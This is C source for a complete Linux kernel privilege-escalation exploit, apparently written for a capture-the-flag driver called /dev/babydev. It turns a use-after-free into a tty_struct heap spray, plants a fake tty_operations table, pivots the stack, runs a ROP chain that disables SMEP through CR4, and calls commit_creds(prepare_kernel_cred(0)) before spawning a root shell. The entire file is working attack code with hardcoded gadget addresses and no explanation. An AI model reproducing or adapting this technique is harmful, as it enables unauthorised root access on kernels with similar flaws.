#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define DEV_PTMX "/dev/ptmx"
#define DEV_BABY "/dev/babydev"

#define SPRAY_ALLOC_TIMES 0x100

int spray_fd[SPRAY_ALLOC_TIMES];

struct _tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);

	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);

	const struct file_operations *proc_fops;
};

#define KERNELCALL __attribute__ ((regparm(3)))

void (* commit_creds)(void *) KERNELCALL;
size_t* (* prepare_kernel_cred)(void *) KERNELCALL;


//gadget
size_t xchg_eax_esp =  0xffffffff810e712d;  //0xffffffff8100008a 
size_t pop_rdi_ret = 0xffffffff8137c24f;
size_t mov_cr4_rdi = 0xffffffff81004bd5;
size_t swapgs = 0xffffffff8105f3c4;
//size_t iretq = 0xffffffff81677b57; 
size_t iretq = 0xffffffff81588639;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	puts("[+] saving status...");
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*] status has been saved.");
}
/*
void save_status(){
	puts("[+] saving status...");
	asm(
	    "movq %%cs,%0\n"
	    "movq %%ss,%1\n"
	    "pushfq\n"
	    "pop %2\n"
	    : "=r"(user_cs),"=r"(user_ss),"=r"(user_rflags)
	    :
	    :"memory");
	puts("[*] status has been saved.");

}*/

void get_shell(){
	printf("shell?\n");
	char *shell = "/bin/sh";
        char *args[] = {shell,NULL};	
	execve(shell,args,NULL);
}

void get_root(){
	commit_creds = 0xffffffff81098650;
	prepare_kernel_cred = 0xffffffff81098980;
	commit_creds(prepare_kernel_cred(0));
}


struct _tty_operations tty_operations;
char buf[0x1000];
int main(){
	int fd1,fd2;
	long i,size;
	size_t base,rop[0x50];

	fd1=fd2=-1;

	//init
	save_status();

	fd1=open(DEV_BABY,O_RDWR);
	if(fd1==-1){
		puts("[x] fd1 open error!\n");
		exit(-1);
	}
	printf("[*] fd1:%d\n",fd1);
	fd2=open(DEV_BABY,O_RDWR);
	if(fd2==-1){
		puts("[x] fd2 open error!\n");
		exit(-1);
	}
	printf("[*] fd2:%d\n",fd2);

	//free chunks
	puts("[+] freeing fd1...\n");
	ioctl(fd1,0x10001,0x2e0);
	close(fd1);
	puts("[*] fd1 has been freed.\n");

	//spray tty
	puts("[+] spraying tty_struct...\n");
	for (i=0;i<SPRAY_ALLOC_TIMES;i++){
		spray_fd[i] = open("/dev/ptmx",O_RDWR | O_NOCTTY);
		if(spray_fd[i]<0){
			puts("[x] open tty error!");
			exit(-1);
		}
	}
	puts("[*] spraying tty_struct complete.\n");
	
	//check spray
	puts("[+] checking spray tty_struct...\n");
	size = read(fd2,buf,0x20);
	if(size < 0x20){
		puts("[x] read buf error !");
		exit(-1);
	}

	if(buf[0] != 0x1 || buf[1] != 0x54){
		puts("[x] tty spray failed!");
		exit(-1);
	}
	puts("[*] spray check complete.\n");
	
	//set fake tty_operations
	puts("[+] setting fake tty_operations...\n");
	tty_operations.ioctl = xchg_eax_esp;	//xchg eax, esp; ret 0;
	*(size_t *)(buf+3*8) = &tty_operations;
	puts("[*] fake tty_operations has been setted.\n");
	
	//stack pivoting
	puts("[+] preparing ROP chain...\n");
	base = xchg_eax_esp & 0xfffff000;
	if(base != mmap(base,0x3000,7,MAP_PRIVATE | MAP_ANONYMOUS,-1,0)){
		puts("[x] mmap error!");
		exit(-1);
	}
	printf("base address: %lx\n",base);

	i=0;
	//pop rdi; ret;
	rop[i++] = pop_rdi_ret;	
	rop[i++] = 0x6f0;
	//push rbp; and rdi, 0xfffffffffffffe6f; mov rbp, rsp; mov cr4, rdi; pop rbp; ret; 
	rop[i++] = mov_cr4_rdi;   
	rop[i++] = get_root;
	//swapgs; pop rbp; ret
	rop[i++] = swapgs; 
	rop[i++] = 0;
	rop[i++] = iretq;
	rop[i++] = get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = base+0x1000;
	rop[i++] = user_ss;

	memcpy(xchg_eax_esp & 0xffffffff,rop,sizeof(rop));
	puts("[*] ROP chain complete.\n");

	//write ROP chain into buf
	write(fd2,buf,0x20);

	puts("[+] getting shell...\n");
	for (i=0;i<SPRAY_ALLOC_TIMES;i++){
		ioctl(spray_fd[i],0,0);
	}

	return 0;
}
